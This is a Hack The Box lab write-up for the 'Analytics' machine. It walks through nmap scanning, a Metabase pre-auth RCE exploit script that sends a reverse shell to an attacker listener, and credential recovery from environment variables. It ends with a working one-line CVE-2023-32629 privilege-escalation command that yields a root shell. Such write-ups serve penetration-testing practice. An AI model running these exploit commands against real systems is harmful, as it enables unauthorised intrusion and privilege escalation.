---
title: Hack the box - Analytics pwned!
date: 2024-03-02 00:00:01 +0000
categories: [hack the box, machine]
tags: [hack the box, machine, analytics, docker, metabase, CVE-2023-32629]
img_path: /assets/img/posts/
---

## Machine info

![Analytics](htb-analytics-info.png)
*Analytics info*

## Annotations

>In this article we are going to assume the following ip addresses:
>
>Local machine (attacker, local host): 10.10.16.101
>
>Target machine (victim, Devvortex): 10.10.11.233
{: .prompt-info}

## Enumeration

If we list the open ports in the machine, we can see that there are two open ports: 22 (ssh) and 80 (http):

`nmap -Pn -n -sS -p- -T5 --min-rate 5000 -oN nmap_initial.txt 10.10.11.233`

```
22/tcp open  ssh
80/tcp open  http
```

## Footprinting

If we look for more information about the services running in those ports we will find the machine address:

`nmap -Pn -n -sVC -p22,80 10.10.11.233`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We add the machine address to our `/etc/hosts`:

`echo "10.10.11.233 analytical.htb" | sudo tee -a /etc/hosts`

Now, we browse to the web to take a look:

![Analytics web](htb-analytics-web.png)
*Analytics web*

If we go to the login page it will not work:

![Analytics web login error](htb-analytics-web-login-error.png)
*Analytics web login error*

The login page it's under the domain `data.analytical.htb`, so let's add it to our `/etc/hosts`:

`echo "10.10.11.233 data.analytical.htb" | sudo tee -a /etc/hosts`

And, let's reload the login page

![Analytics web login page](htb-analytics-web-login.png)
*Analytics web login page*

## Foothold

### Docker container

We can see that is using `metabase`, so let's look for vulnerabilities:

`searchsploit metabase`

`Metabase 0.46.6 - Pre-Auth Remote Code Execution | linux/webapps/51797.py`

Ok, we got one.
It's a RCE (Remote Code Execution), so we will start listening on our side to try to get a remote shell:

`nc -lvnp 1234`

And, now we copy the script to our working directory and we run it:

`cp /opt/exploitdb/exploits/linux/webapps/51797.py metabase_exploit.py`

`sudo python3 metabase_exploit.py --lhost 10.10.16.101 --lport 1234 --sport 80 --url http://data.analytical.htb`

We got shell, but inside a docker container.
If we print the environment variables, we will find some credentials:

```
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=16a5278f5551
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8

META_USER=metalytics
META_PASS=fakepassword

MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=2
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/bin/printenv
```

### metalytics

With our new credentials, we will login through ssh:

`ssh metalytics@10.10.11.233`

First, we get our user flag:

`cat user.txt`

And, now, we see that with our new user we will not be able to escalate privileges...

```
metalytics@analytics:~$ id
uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)
metalytics@analytics:~$ sudo -l
[sudo] password for metalytics:
Sorry, user metalytics may not run sudo on localhost.
```

If we look the system version we can see that is a vulnerable Ubuntu version.

```
metalytics@analytics:~$ uname -a
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/linux
```

The vulnerability is [CVE-2023-32629](https://nvd.nist.gov/vuln/detail/CVE-2023-32629), so we will exploit it to gain root privileges:

`unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'`

Now that we are root, we can get our system flag:

`cat /root/root.txt`

## Pwned!

![Analytics](htb-analytics-pwned.png)
*Analytics has been Pwned*

*Enjoy! ;)*
